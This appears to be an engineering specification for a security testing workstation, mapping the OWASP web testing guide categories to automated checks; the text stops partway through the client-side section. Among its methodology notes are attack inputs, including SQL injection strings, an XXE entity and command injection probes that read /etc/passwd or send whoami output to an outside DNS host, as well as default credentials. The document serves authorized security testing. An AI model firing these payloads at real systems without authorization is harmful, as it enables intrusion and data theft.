# GLOBAL SECURITY TOOL RESEARCH, VULNERABILITY TAXONOMY & SENTINEL V6 ARCHITECTURAL SPECIFICATION
**SENTINEL Enterprise Cyber Security Workstation Architecture**
**Document ID**: `SENTINEL-SPEC-M1-RES-001`
**Version**: 6.0.0-PROD
**Classification**: Authoritative Engineering Specification & Research Compendium
**Publication Date**: August 2026

---

## 1. Executive Summary & Architectural Philosophy

Modern enterprise security testing faces a crippling crisis of fragmentation, operational overhead, and excessive false positives. Security engineers and penetration testers are forced to juggle dozens of disconnected command-line utilities (Nuclei, Katana, FFUF, SQLMap, Interactsh, GAU, Semgrep, Trivy) alongside heavyweight, memory-intensive Java-based interception proxies (Burp Suite, OWASP ZAP) or closed-source freemium alternatives (Caido). This tool sprawl imposes severe costs:

1. **Context Switching & Friction**: Disparate CLI flags, ad-hoc piping (`gau | httpx | katana | nuclei`), and mismatched JSON/JSONL schemas require custom glue scripts and manual triage.
2. **Resource Waste & High Memory Footprint**: Legacy JVM-based proxies consume 1.5 GB to 3.0 GB of RAM at idle, triggering garbage-collection pauses during high-throughput scanning.
3. **Unverified Findings (The False Positive Dilemma)**: Heuristic pattern-matching tools produce high volumes of candidate alerts without cryptographic proof, overwhelming triage teams.
4. **Scope Leakage Risks**: Standalone tools lack unified, fail-closed scope enforcement, risking inadvertent active probing of out-of-scope targets or third-party CDNs.
5. **Supply Chain & Licensing Liabilities**: Commercial distribution of scanning platforms is threatened by viral copyleft licenses (GPLv2, GPLv3, AGPLv3) embedded in legacy tools.

### The SENTINEL V6 Paradigm
SENTINEL V6 resolves these structural deficiencies through a **Clean-Room Native Rust Architecture** paired with a dense, responsive Tauri/React desktop workstation:
- **Single Native Memory Space**: Replaces 15+ standalone Go, Python, and Java runtimes with unified, zero-garbage-collection Rust crates (`sentinel_core`).
- **In-Memory Security Context Graph**: A unified knowledge graph (`Asset -> Endpoint -> Parameter -> Request -> Response -> Finding`) that allows discovery tools (Katana/HTTPX/GAU) to immediately feed fuzzer mutation engines (FFUF/Param Miner) and active verification modules (Nuclei/SQLMap/Interactsh).
- **Verification-First Finding Lifecycle**: No vulnerability candidate is promoted to a confirmed Finding without deterministic proof (CAS SHA-256 Request/Response, 3-sigma timing differential, AES-256 OAST callback receipt, or Playwright DOM execution trace).
- **Fail-Closed Scope Gate (SEC-01)**: Every outbound TCP packet, HTTP request, fuzzer payload, and browser navigation is cryptographically evaluated against active scope rules.
- **Commercial License Isolation (LIC-INV-01 to 04)**: Zero viral copyleft code compiled into the core engine. All third-party integrations operate via out-of-process subprocess adapters or zero-capability WASM sandboxes.

---

## 2. Authoritative Standardized Methodologies

### 2.1 OWASP Web Security Testing Guide (WSTG v4.2 / v5.0) Complete Taxonomy

The OWASP WSTG represents the industry gold standard for web application security assessments. SENTINEL V6 implements comprehensive, automated, and semi-automated coverage across all 12 WSTG categories and 70+ test IDs.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                 OWASP WSTG v4.2 / v5.0 TEST CATEGORIES                      │
├────────────┬───────────────────────────────────────┬────────────┬───────────┤
│ Code       │ Category Name                         │ Test Count │ Engine    │
├────────────┼───────────────────────────────────────┼────────────┼───────────┤
│ WSTG-INFO  │ Information Gathering                 │ 10 Tests   │ Scanner   │
│ WSTG-CONF  │ Configuration & Deployment Management │ 11 Tests   │ Scanner   │
│ WSTG-IDNT  │ Identity Management                   │ 5 Tests    │ Auth/Diff │
│ WSTG-AUTH  │ Authentication Testing                │ 10 Tests   │ Auth/OAST │
│ WSTG-ATHZ  │ Authorization Testing                 │ 4 Tests    │ Authz/IRA+│
│ WSTG-SESS  │ Session Management Testing            │ 9 Tests    │ Auth/Diff │
│ WSTG-INPV  │ Input Validation Testing              │ 19 Tests   │ Fuzzer/Ver│
│ WSTG-ERRR  │ Error Handling                        │ 2 Tests    │ Scanner   │
│ WSTG-CRYP  │ Cryptography                          │ 4 Tests    │ Proxy/TLS │
│ WSTG-CLNT  │ Client-Side Testing                   │ 13 Tests   │ Browser   │
│ WSTG-APIT  │ API Testing                           │ 3 Tests    │ API Engine│
│ WSTG-BUSL  │ Business Logic Testing                │ 9 Tests    │ Logic/Race│
└────────────┴───────────────────────────────────────┴────────────┴───────────┘
```

#### Category 1: Information Gathering (WSTG-INFO)
- **WSTG-INFO-01: Conduct Search Engine Discovery and Reconnaissance for Information Leakage**
  - *Methodology*: Passive ingestion of OSINT indexing queries (`site:target.com filetype:pdf`, `intitle:"index of"`, `inurl:admin`).
  - *Automation*: Ingests Google, Bing, and Shodan API results without direct target interaction.
  - *FP Mitigation*: Domain ownership verification and automated validation of indexed resource relevance.
- **WSTG-INFO-02: Fingerprint Web Server**
  - *Methodology*: Active analysis of HTTP response headers (`Server`, `X-Powered-By`), HTTP/2 SETTINGS frame parameters, TLS cipher preference ordering, and TCP/IP stack signatures.
  - *Automation*: Automated passive inspection of all proxy traffic + active differential probe matching.
  - *FP Mitigation*: Strips spoofed headers; correlates header clues with TLS/TCP behavioral signatures.
- **WSTG-INFO-03: Review Webserver Metafiles for Information Leakage**
  - *Methodology*: Active fetching and parsing of `/robots.txt`, `/sitemap.xml`, `/.well-known/security.txt`, `/crossdomain.xml`, `/.well-known/assetlinks.json`.
  - *Automation*: Automated pre-scan crawler step with strict URL path normalization.
  - *FP Mitigation*: Verifies 200 OK status returns genuine text/plain or XML, discarding soft-404 HTML fallback templates.
- **WSTG-INFO-04: Enumerate Applications on Webserver**
  - *Methodology*: Virtual host brute-forcing (Host header mutation), SNI probing, and reverse DNS IP lookups.
  - *Automation*: Active high-throughput async fuzzer with baseline differential filtering.
  - *FP Mitigation*: Filters wildcard DNS responses and catch-all default virtual hosts via response body DOM hashing.
- **WSTG-INFO-05: Review Webpage Content for Information Leakage**
  - *Methodology*: Stream-parsing HTML comments (`<!-- -->`), JavaScript source code, inline debug variables, internal RFC 1918 IP addresses, staging URLs, and developer emails.
  - *Automation*: Passive stream parser extracting regex patterns and calculating Shannon entropy for secret tokens.
  - *FP Mitigation*: AST verification to distinguish minified variable names from genuine secret tokens.
- **WSTG-INFO-06: Identify Application Entry Points**
  - *Methodology*: Mapping all URLs, query parameters, request bodies (JSON, XML, multipart), headers (`X-Forwarded-*`, `User-Agent`, `Referer`), and WebSockets.
  - *Automation*: Passive proxy harvester + headless Playwright crawler (`sentinel_browser`).
  - *FP Mitigation*: Canonical URL parameter deduplication and REST path parameterization (`/api/users/{id}`).
- **WSTG-INFO-07: Map Execution Paths Through Application**
  - *Methodology*: Tracing multi-step user workflows (checkout, onboarding, password reset) and constructing state transition graphs.
  - *Automation*: Security Context Graph state-machine clustering.
  - *FP Mitigation*: Groups redundant idempotent GET requests into single functional nodes.
- **WSTG-INFO-08: Fingerprint Web Application Framework**
  - *Methodology*: Identifying cookies (`JSESSIONID`, `PHPSESSID`, `ASP.NET_SessionId`, `connect.sid`), DOM element IDs, and framework asset paths (`/wp-content/`, `/_next/static/`).
  - *Automation*: Passive regex and DOM fingerprinting engine.
  - *FP Mitigation*: Multi-factor confidence scoring requiring matching cookie + asset + header signatures.
- **WSTG-INFO-09: Fingerprint Web Application**
  - *Methodology*: Identifying commercial off-the-shelf (COTS) and open-source applications (Jira, WordPress, Grafana, Jenkins) via static file hashes.
  - *Automation*: Favicon MurmurHash3 calculation and `/manifest.json` static hash checks.
  - *FP Mitigation*: Exact hash matching against curated, version-controlled ground-truth database.
- **WSTG-INFO-10: Map Application Architecture**
  - *Methodology*: Mapping reverse proxies, load balancers, CDNs, WAFs, API gateways, and microservices via header analysis (`Via`, `X-Cache`, `CF-Ray`), parser discrepancies, and timing differentials.
  - *Automation*: Passive header topology grapher + non-destructive probe delays.
  - *FP Mitigation*: Evaluates only infrastructure-generated response headers, ignoring unverified client-supplied headers.

#### Category 2: Configuration and Deployment Management Testing (WSTG-CONF)
- **WSTG-CONF-01: Test Network Infrastructure Configuration**
  - *Methodology*: High-speed port scanning, admin interface exposure check, and service banner validation.
  - *Automation*: Native async raw SYN / TCP connect prober (`sentinel_coverage`).
  - *FP Mitigation*: Restricts execution strictly to explicit in-scope IP/CIDR boundaries.
- **WSTG-CONF-02: Test Application Platform Configuration**
  - *Methodology*: Probing for directory indexing, default welcome pages, and exposed management consoles (`/manager/html`, `/solr/`, `/actuator/health`).
  - *Automation*: Active dictionary probe with strict content-type and body signature verification.
  - *FP Mitigation*: Distinguishes custom 404 pages from valid administrative consoles.
- **WSTG-CONF-03: Test File Extensions Handling for Sensitive Information**
  - *Methodology*: Requesting files with alternative/backup extensions: `.bak`, `.old`, `.orig`, `~`, `.swp`, `.zip`, `.tar.gz`, `.sql`.
  - *Automation*: Parameterized fuzzer appending suffixes to identified script endpoints.
  - *FP Mitigation*: Binary content verification (magic bytes for ZIP/GZ/SQL) or plain-text code reflection.
- **WSTG-CONF-04: Review Old Backup and Unreferenced Files for Sensitive Information**
  - *Methodology*: Fuzzing for unlinked configuration files (`.env`, `config.php.bak`, `web.config`, `settings.json`, `.git/HEAD`, `.svn/entries`).
  - *Automation*: Active scan rule targeting webroot and discovered directories.
  - *FP Mitigation*: For `.git/HEAD`, verifies `ref: refs/`; for `.env`, verifies `KEY=VALUE` structural syntax.
- **WSTG-CONF-05: Enumerate Infrastructure and Application Admin Interfaces**
  - *Methodology*: Probing for administrative paths (`/admin`, `/administrator`, `/wp-admin`, `/backend`, `/cpanel`).
  - *Automation*: Context-aware wordlist fuzzing.
  - *FP Mitigation*: Ensures response status is 200 or 401/403 with real login forms, discarding SPA fallback HTML.
- **WSTG-CONF-06: Test HTTP Methods**
  - *Methodology*: Sending `OPTIONS`, `PUT`, `DELETE`, `TRACE`, `TRACK`, `CONNECT`, `PATCH`, `PROPFIND`, `DEBUG`. Check if `TRACE` reflects request headers (XST) or `PUT` allows arbitrary upload.
  - *Automation*: Active probe sending each method to static and dynamic endpoints.
  - *FP Mitigation*: For `PUT`, tests with a unique random-named non-executable canary file (`.txt`) and verifies deletion.
- **WSTG-CONF-07: Test HTTP Strict Transport Security (HSTS)**
  - *Methodology*: Inspecting `Strict-Transport-Security` header in HTTPS responses. Verifying `max-age` (>= 31536000), `includeSubDomains`, and `preload`.
  - *Automation*: Passive response header auditor.
  - *FP Mitigation*: Evaluates only over HTTPS; tags as informational if target is an internal intranet.
- **WSTG-CONF-08: Test RIA Cross Domain Policy**
  - *Methodology*: Inspecting `/crossdomain.xml` and `/clientaccesspolicy.xml` for wildcard domain authorizations (`<allow-access-from domain="*"/>`).
  - *Automation*: Active GET probe + XML parser.
  - *FP Mitigation*: Confirms file is served with valid XML MIME type and domain is wildcarded.
- **WSTG-CONF-09: Test File Permission**
  - *Methodology*: Testing for unauthorized write/delete permissions on webroot assets or sensitive configuration directories.
  - *Automation*: Active non-destructive write attempts.
  - *FP Mitigation*: Ensures canary writes do not overwrite existing application assets.
- **WSTG-CONF-10: Test for Subdomain Takeover**
  - *Methodology*: Identifying DNS CNAME records pointing to unclaimed external services (GitHub Pages, AWS S3, Heroku, Azure Traffic Manager, Zendesk, Fastly).
  - *Automation*: Active DNS query + HTTP request checking for service-specific unclaimed bucket signatures.
  - *FP Mitigation*: Strict signature matching against curated cloud provider error strings.
- **WSTG-CONF-11: Test Cloud Storage**
  - *Methodology*: Identifying AWS S3, Google Cloud Storage, Azure Blob URLs; testing for unauthenticated read/write/list permissions (`ListBucket`, `PutObject`).
  - *Automation*: Active REST probe with signed/unsigned requests.
  - *FP Mitigation*: Validates XML response schema matches standard S3 `<ListBucketResult>` or GCS bucket listing.

#### Category 3: Identity Management Testing (WSTG-IDNT)
- **WSTG-IDNT-01: Test Role Definitions**
  - *Methodology*: Enumerating valid system roles (Admin, Moderator, Standard User, Billing, Auditor) and mapping intended privileges.
  - *Automation*: IRA+ (Identity & Role Authorization) matrix configuration and evaluation.
  - *FP Mitigation*: Requires explicit multi-identity test credentials configured by the operator.
- **WSTG-IDNT-02: Test User Registration Process**
  - *Methodology*: Testing for registration spoofing, email verification bypass, and default role assignment tampering (`{"role": "admin"}` in registration POST).
  - *Automation*: Active parameter fuzzer on registration endpoints.
  - *FP Mitigation*: Compares registration response data and verifies elevated privileges on subsequent authenticated requests.
- **WSTG-IDNT-03: Test Account Provisioning Process**
  - *Methodology*: Verifying administrative workflows for creating, disabling, and assigning permissions to sub-accounts.
  - *Automation*: State-machine test checking if disabled users can still perform actions.
  - *FP Mitigation*: Measures active session invalidation vs cached token expiration.
- **WSTG-IDNT-04: Testing for Account Enumeration and Guessable User Account**
  - *Methodology*: Analyzing differential responses on login, password reset, and registration endpoints (status codes, error messages, response times, response body length).
  - *Automation*: Statistical differential fuzzer calculating Levenshtein distance and response latency distributions.
  - *FP Mitigation*: Accounts for rate limiting, CAPTCHA activation, and network jitter via baseline noise calibration.
- **WSTG-IDNT-05: Testing for Weak or Unenforced Username Policy**
  - *Methodology*: Testing acceptance of trivial usernames, special characters, whitespace padding, case-insensitivity collisions (`admin` vs `Admin`).
  - *Automation*: Active registration fuzzing with unicode/whitespace variations.
  - *FP Mitigation*: Verifies whether database normalizes usernames before lookup.

#### Category 4: Authentication Testing (WSTG-AUTH)
- **WSTG-AUTH-01: Testing for Credentials Transported over an Encrypted Channel**
  - *Methodology*: Checking if login forms submit over unencrypted HTTP, or if HTTPS pages load insecure form action endpoints (`<form action="http://...">`).
  - *Automation*: Passive DOM parser and traffic inspector.
  - *FP Mitigation*: Verifies scheme of form `action` URL and enclosing page.
- **WSTG-AUTH-02: Testing for Default Credentials**
  - *Methodology*: Testing standard default username/password combinations (`admin:admin`, `root:toor`, `tomcat:s3cret`) against known COTS and administrative interfaces.
  - *Automation*: Targeted active dictionary attack bounded by strict rate limits.
  - *FP Mitigation*: Confirms successful authentication via redirect to dashboard, cookie issuance, or 200 OK dashboard content.
- **WSTG-AUTH-03: Testing for Weak Lock Out Mechanism**
  - *Methodology*: Submitting N invalid login attempts (e.g. 5, 10, 20) and observing if account locks, requires CAPTCHA, or delays response. Check for bypasses: `X-Forwarded-For` header spoofing, username casing, password spraying.
  - *Automation*: Controlled active runner with configurable attempt threshold.
  - *FP Mitigation*: Prevents accidental production lockout via operator-designated test user accounts.
- **WSTG-AUTH-04: Testing for Bypassing Authentication Schema**
  - *Methodology*: Testing direct URL access to protected resources, forced browsing, parameter tampering (`authenticated=true`), HTTP verb tampering, SQLi auth bypass (`admin'--`).
  - *Automation*: Differential active runner comparing unauthenticated request response to authenticated baseline.
  - *FP Mitigation*: Ensures protected pages return actual private data, not public login redirects.
- **WSTG-AUTH-05: Testing for Vulnerabilities in Remember Password and Auto-Login**
  - *Methodology*: Analyzing remember-me tokens (predictability, static hashes of username/email, lack of revocation upon password change).
  - *Automation*: Token capture + entropy calculation + re-test after password update.
  - *FP Mitigation*: Differentiates secure HMAC-SHA256 random tokens from insecure `base64(username:md5(pass))`.
- **WSTG-AUTH-06: Testing for Browser Cache Weaknesses**
  - *Methodology*: Checking `Cache-Control` (`no-store`, `no-cache`, `must-revalidate`) and `Pragma: no-cache` on authenticated sensitive responses.
  - *Automation*: Passive response header check on sensitive endpoints.
  - *FP Mitigation*: Scopes check strictly to authenticated pages containing PII or financial data.
- **WSTG-AUTH-07: Testing for Weak Password Policy**
  - *Methodology*: Submitting short, simple, or common dictionary passwords during registration or password change.
  - *Automation*: Active mutation runner submitting weak password samples.
  - *FP Mitigation*: Verifies backend validation response vs client-side HTML5 validation.
- **WSTG-AUTH-08: Testing for Weak Security Question / Answer**
  - *Methodology*: Assessing predictability, lack of entropy, and bruteforce resistance of security questions.
  - *Automation*: Passive inspection + wordlist bruteforce.
  - *FP Mitigation*: Manual review of custom security question schemas.
- **WSTG-AUTH-09: Testing for Weak Password Reset and Recovery Functionality**
  - *Methodology*: Analyzing reset token entropy, expiration, single-use enforcement, Host header poisoning in reset emails, and leakages via URL query strings.
  - *Automation*: Active reset token generator + OAST Host header poisoning probe.
  - *FP Mitigation*: Confirms reset token cannot be reused once consumed or expired.
- **WSTG-AUTH-10: Testing for Multi-Factor Authentication (MFA)**
  - *Methodology*: Testing for MFA bypasses: direct navigation to post-MFA endpoints, manipulation of MFA success response (`{"success": true}`), reuse of TOTP tokens, brute-forcing 4/6-digit SMS/TOTP codes without rate limiting.
  - *Automation*: State transition fuzzing across Step 1 (password) and Step 2 (MFA).
  - *FP Mitigation*: Verifies session token state transitions from `PRE_MFA` to `AUTHENTICATED`.

#### Category 5: Authorization Testing (WSTG-ATHZ)
- **WSTG-ATHZ-01: Testing Directory Traversal and File Inclusion**
  - *Methodology*: Testing `../`, `..%2f`, nested encodings, absolute paths (`/etc/passwd`, `C:\Windows\win.ini`) in filename/path parameters.
  - *Automation*: Active fuzzer using path traversal dictionary + regex matching known OS signatures (`root:.*:0:0:`, `\[extensions\]`).
  - *FP Mitigation*: Avoids false positives on reflection by requiring structured regex matches of actual operating system configuration files.
- **WSTG-ATHZ-02: Testing for Bypassing Authorization Schema**
  - *Methodology*: Testing horizontal and vertical authorization bypasses. Access User A's data using User B's session or unauthenticated request.
  - *Automation*: IRA+ Dual-Identity Differential Matrix (replay User A request with User B session and compare response body/status).
  - *FP Mitigation*: Excludes public endpoints, stripping dynamic nonces/timestamps from diff comparison.
- **WSTG-ATHZ-03: Testing for Privilege Escalation**
  - *Methodology*: Testing vertical escalation (standard user invoking admin functions `/api/admin/deleteUser`) and horizontal escalation (tenant A modifying tenant B assets).
  - *Automation*: Multi-session replay with role tagging.
  - *FP Mitigation*: Requires verification that administrative operation was actually executed (e.g. database change or state change).
- **WSTG-ATHZ-04: Testing for Insecure Direct Object References (IDOR)**
  - *Methodology*: Substituting integer IDs, UUIDs, or hashes in REST endpoints (`GET /api/documents/1001` -> `GET /api/documents/1002`).
  - *Automation*: Pattern detection on identifier parameters + multi-token cross-user replay.
  - *FP Mitigation*: Verifies response contains unique record data belonging strictly to the target object.

#### Category 6: Session Management Testing (WSTG-SESS)
- **WSTG-SESS-01: Testing for Session Management Schema**
  - *Methodology*: Analyzing session token issuance, transport, storage, and predictability.
  - *Automation*: Statistical entropy evaluation (Shannon entropy, Chi-square test) across 10,000 generated tokens.
  - *FP Mitigation*: Ensures test samples are collected under identical conditions.
- **WSTG-SESS-02: Testing for Cookie Attributes**
  - *Methodology*: Inspecting `Set-Cookie` headers for `Secure`, `HttpOnly`, `SameSite` (`Strict`/`Lax`/`None`), `Path`, and `Domain` attributes.
  - *Automation*: Passive response header analyzer.
  - *FP Mitigation*: Differentiates session cookies from non-sensitive tracking/preference cookies.
- **WSTG-SESS-03: Testing for Session Fixation**
  - *Methodology*: Establishing session ID as unauthenticated user, logging in, and verifying if session ID is renewed or remains identical.
  - *Automation*: Automated 3-step test: `GET /login` -> capture cookie -> `POST /login` -> compare cookie.
  - *FP Mitigation*: Ensures all cookie keys matching session identifiers are tracked and compared.
- **WSTG-SESS-04: Testing for Exposed Session Variables**
  - *Methodology*: Checking for session tokens in URLs (`GET /dashboard?sessionid=xyz`), Referer headers, browser history, or logs.
  - *Automation*: Passive URL query parser and Referer header inspector.
  - *FP Mitigation*: Filters out non-identifying state parameters (e.g., pagination or tab indices).
- **WSTG-SESS-05: Testing for Cross Site Request Forgery (CSRF)**
  - *Methodology*: Checking state-changing POST/PUT/DELETE requests for anti-CSRF tokens, SameSite cookie protection, and custom header requirements (`X-Requested-With`).
  - *Automation*: Active replay without CSRF token or with altered token + SameSite attribute audit.
  - *FP Mitigation*: Determines if endpoint accepts JSON content-type (which requires CORS preflight) vs form-urlencoded.
- **WSTG-SESS-06: Testing for Logout Functionality**
  - *Methodology*: Logging in, capturing session token, issuing logout request, then replaying authenticated request with old token to verify server-side invalidation.
  - *Automation*: Active sequential test: Login -> Capture -> Logout -> Replay -> Assert 401/403/Redirect.
  - *FP Mitigation*: Ensures replayed request targets an authenticated endpoint that actually requires valid session data.
- **WSTG-SESS-07: Testing Session Timeout**
  - *Methodology*: Measuring idle session timeout (inactivity period after which token expires) and absolute session timeout.
  - *Automation*: Automated delayed replay test (t=0, t=15m, t=30m, t=60m).
  - *FP Mitigation*: Runs within local lab or staging environments to avoid unexpected session terminations.
- **WSTG-SESS-08: Testing for Session Puzzling / Variable Overloading**
  - *Methodology*: Populating session variables in one context (e.g., password reset phase) and accessing another context (e.g., profile editor) that mistakenly reuses the same session variable name.
  - *Automation*: Cross-endpoint parameter mutation and state sequence replay.
  - *FP Mitigation*: Maps application session state variable graph.
- **WSTG-SESS-09: Testing for Session Hijacking**
  - *Methodology*: Testing MITM resistance, token interception, predictability, and lack of client binding (IP/User-Agent fingerprint binding).
  - *Automation*: Replaying captured session token from simulated distinct IP and client headers.
  - *FP Mitigation*: Accounts for mobile clients with dynamic IP routing.

#### Category 7: Input Validation Testing (WSTG-INPV)
- **WSTG-INPV-01: Testing for Reflected Cross Site Scripting (XSS)**
  - *Methodology*: Injecting unique alphanumeric canary strings with special characters (`<sentinel"'>`) into parameters and inspecting response body context (HTML body, attribute, script block, event handler).
  - *Automation*: Context-aware injection engine using AST/HTML parser.
  - *FP Mitigation*: Verifies that unescaped executable characters break out of context.
- **WSTG-INPV-02: Testing for Stored Cross Site Scripting (XSS)**
  - *Methodology*: Submitting unique canary payloads to input endpoints and crawling/inspecting stored display endpoints.
  - *Automation*: Two-phase scanner: Phase 1 injection with UUID canary -> Phase 2 spidering and DOM analysis.
  - *FP Mitigation*: Tracks injection-to-sink mapping in Security Context Graph.
- **WSTG-INPV-03: Testing for HTTP Parameter Pollution (HPP)**
  - *Methodology*: Injecting duplicate parameters (`?id=1&id=2`) to test backend vs WAF parameter precedence (first, last, concatenated, array).
  - *Automation*: Active fuzzer sending dual-parameter requests.
  - *FP Mitigation*: Verifies semantic impact on backend SQL query or authorization check.
- **WSTG-INPV-04: Testing for SQL Injection**
  - *Methodology*: Testing in-band error-based (`'`, `"` syntax errors), union-based (`UNION SELECT ...`), boolean-based (`AND 1=1` vs `AND 1=2`), time-based (`WAITFOR DELAY`, `pg_sleep()`, `sleep()`), and out-of-band (OAST DNS lookups via `xp_dirtree`, `UTL_INADDR`).
  - *Automation*: Multi-stage SQLi engine: Error probe -> Boolean differential probe -> Time-based probe -> OAST proof.
  - *FP Mitigation*: Time-based checks must calibrate against baseline latency jitter (e.g., 3 standard deviations) and verify with multiple distinct sleep durations (e.g. 5s and 10s).
- **WSTG-INPV-05: Testing for LDAP Injection**
  - *Methodology*: Injecting LDAP filter metacharacters (`*`, `(`, `)`, `&`, `|`, `!`) to alter search queries.
  - *Automation*: Active mutation runner with LDAP error pattern matching.
  - *FP Mitigation*: Checks for specific LDAP error messages (`LDAPException`, `Invalid DN syntax`).
- **WSTG-INPV-06: Testing for XML Injection**
  - *Methodology*: Injecting XML metacharacters (`<`, `>`, `&`, `<!--`, `]]>`) into XML payloads to alter document structure.
  - *Automation*: Active XML structure fuzzer.
  - *FP Mitigation*: Verifies XML parsing error vs structural modification.
- **WSTG-INPV-07: Testing for XML External Entity (XXE) Injection**
  - *Methodology*: Injecting external entity definitions (`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://oast-token.sentinel.internal"> ]>`) referencing local files or OAST listener.
  - *Automation*: Active payload injector with dedicated OAST DNS/HTTP correlation.
  - *FP Mitigation*: Proof strictly established via out-of-band callback receipt or file content disclosure (`root:x:0:0`).
- **WSTG-INPV-08: Testing for SSI Injection**
  - *Methodology*: Injecting Server-Side Include directives (`<!--#exec cmd="ls" -->`, `<!--#echo var="DATE_LOCAL" -->`).
  - *Automation*: Active fuzzer looking for executed output reflection.
  - *FP Mitigation*: Distinguishes comment reflection from evaluated SSI expressions.
- **WSTG-INPV-09: Testing for XPath Injection**
  - *Methodology*: Injecting XPath syntax (`' or '1'='1`, `' or count(parent::*)=0 or 'a'='b`) into XML query fields.
  - *Automation*: Boolean differential analysis of XML-backed responses.
  - *FP Mitigation*: Verifies boolean true/false query divergences.
- **WSTG-INPV-10: Testing for IMAP/SMTP Injection**
  - *Methodology*: Injecting CRLF sequences (`%0d%0a`) and SMTP commands (`MAIL FROM:`, `RCPT TO:`, `DATA`) into mail-sending parameters.
  - *Automation*: Active fuzzer + OAST mail listener.
  - *FP Mitigation*: Confirms receipt of injected recipient email via OAST SMTP listener.
- **WSTG-INPV-11: Testing for Code Injection (Command Injection, Eval)**
  - *Methodology*: Injecting shell metacharacters (`;`, `|`, `&`, `` ` ``, `$(...)`, `\n`) and language eval constructs (`system()`, `Runtime.getRuntime().exec()`, `eval()`).
  - *Automation*: In-band command output extraction (`id`, `whoami`, `cat /etc/passwd`) + time delay (`sleep 10`) + OAST DNS (`nslookup $(whoami).oast.sentinel`).
  - *FP Mitigation*: Requires matching command output or calibrated OAST callback with command output in DNS subdomain.
- **WSTG-INPV-12: Testing for Command Injection**
  - *Methodology*: Targeting OS command execution interfaces via shell argument injection and delimiter chaining.
  - *Automation*: Safe non-destructive probes (`echo <uuid>`, `sleep <n>`).
  - *FP Mitigation*: Verifies canary UUID in stdout/stderr response.
- **WSTG-INPV-13: Testing for Format String Injection**
  - *Methodology*: Injecting format specifiers (`%s`, `%x`, `%n`, `%p`, `{0}`, `{}`) into native or formatted string inputs.
  - *Automation*: Active fuzzer monitoring for server 500 crashes or memory leaks.
  - *FP Mitigation*: Filters out standard URL encoding `%20` false alarms.
- **WSTG-INPV-14: Testing for Incubated Vulnerability (Second-Order Injection)**
  - *Methodology*: Injecting payloads into data entry points (e.g. user profile name), then triggering downstream background jobs or administrative dashboards to observe execution.
  - *Automation*: Context Graph cross-endpoint correlation engine.
  - *FP Mitigation*: Tracks payload canary ID across all subsequent requests and responses.
- **WSTG-INPV-15: Testing for HTTP Splitting / Smuggling**
  - *Methodology*: Injecting CRLF (`\r\n`) into headers (`Set-Cookie`, `Location`) and testing HTTP request desynchronization.
  - *Automation*: Protocol-level desync engine with raw socket manipulation.
  - *FP Mitigation*: Verifies downstream response queue misalignment.
- **WSTG-INPV-16: Testing for HTTP Incoming Request (SSRF)**
  - *Methodology*: Supplying internal IPs (`127.0.0.1`, `169.254.169.254`, `10.0.0.0/8`), cloud metadata hostnames, and unique OAST callback URLs into URL/fetch parameters.
  - *Automation*: Active injector + OAST DNS/HTTP server with payload token tracking.
  - *FP Mitigation*: Confirms internal service banner disclosure or cryptographic OAST interaction proof.
- **WSTG-INPV-17: Testing for Host Header Injection**
  - *Methodology*: Mutating `Host` header (`Host: attacker.com`, `X-Forwarded-Host: attacker.com`) and observing if host is reflected in password reset links, scripts, or redirects.
  - *Automation*: Active header fuzzer with OAST canary domain.
  - *FP Mitigation*: Checks if reflected link actually leads to external attacker-controlled domain.
- **WSTG-INPV-18: Testing for Server-Side Template Injection (SSTI)**
  - *Methodology*: Injecting mathematical expressions (`${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`) and observing mathematical evaluation (`49`).
  - *Automation*: Polyglot template decision tree injector.
  - *FP Mitigation*: Confirms evaluated result `49` appears where `${7*7}` was injected, while non-executable strings `${abc}` do not evaluate.
- **WSTG-INPV-19: Testing for Server-Side JavaScript / Prototype Pollution**
  - *Methodology*: Injecting `__proto__`, `constructor.prototype` JSON properties (`{"__proto__": {"polluted": true}}`) into JSON endpoints and testing if prototype property reflects globally.
  - *Automation*: Differential JSON fuzzer with secondary probe checking property reflection.
  - *FP Mitigation*: Ensures polluted property was not merely echoed back as a standard JSON key.

#### Category 8: Error Handling Testing (WSTG-ERRR)
- **WSTG-ERRR-01: Testing for Improper Error Handling**
  - *Methodology*: Sending malformed inputs (invalid JSON, null bytes `%00`, unexpected types `id[]=1`, excessively large strings) to trigger unhandled exceptions.
  - *Automation*: Passive and active scanner scanning for stack traces, framework error templates (Django debug screen, Rails error page, Spring Whitelabel Error Page, ASP.NET yellow screen).
  - *FP Mitigation*: Matches specific stack trace signatures (`at com.example...`, `Traceback (most recent call last):`, `File "...", line ...`).
- **WSTG-ERRR-02: Testing for Error Codes**
  - *Methodology*: Analyzing HTTP status codes and custom application error codes for information leaks or inconsistent state disclosure.
  - *Automation*: Passive response code auditor.
  - *FP Mitigation*: Correlates error codes with business logic context.

#### Category 9: Cryptography Testing (WSTG-CRYP)
- **WSTG-CRYP-01: Testing for Weak Transport Layer Security (TLS)**
  - *Methodology*: Testing SSLv2, SSLv3, TLS 1.0, TLS 1.1 support, weak ciphers (RC4, 3DES, EXPORT, NULL, CBC mode ciphers susceptible to POODLE/Lucky13), certificate validity, and certificate chain.
  - *Automation*: Active TLS handshake probe evaluating supported cipher suites and protocols.
  - *FP Mitigation*: Matches against NIST SP 800-52 and Mozilla Modern TLS guidelines.
- **WSTG-CRYP-02: Testing for Padding Oracle**
  - *Methodology*: Mutating ciphertext bytes in CBC mode encrypted parameters (e.g. cookies) and analyzing differential responses (padding error vs decryption error vs valid ciphertext).
  - *Automation*: Active cryptographic oracle fuzzer analyzing byte mutations and timing differences.
  - *FP Mitigation*: Strict statistical verification of padding oracle responses.
- **WSTG-CRYP-03: Testing for Sensitive Information Sent via Unencrypted Channels**
  - *Methodology*: Detecting transmission of credentials, PII, payment info, tokens over unencrypted HTTP, or in URL query strings of HTTPS requests.
  - *Automation*: Passive traffic scanner with DLP regex pattern matching.
  - *FP Mitigation*: Restricts alerts to high-confidence PII/credential patterns.
- **WSTG-CRYP-04: Testing for Weak Encryption**
  - *Methodology*: Identifying use of broken hash algorithms (MD5, SHA1 for signatures), weak symmetric ciphers (DES, RC4), or insufficient RSA key lengths (< 2048 bits).
  - *Automation*: Cryptographic artifact inspection in certificates, JWT tokens, and exported keys.
  - *FP Mitigation*: Contextual assessment (e.g. MD5 used for checksum vs password hashing).

#### Category 10: Client-Side Testing (WSTG-CLNT)
- **WSTG-CLNT-01: Testing for DOM-Based Cross Site Scripting**
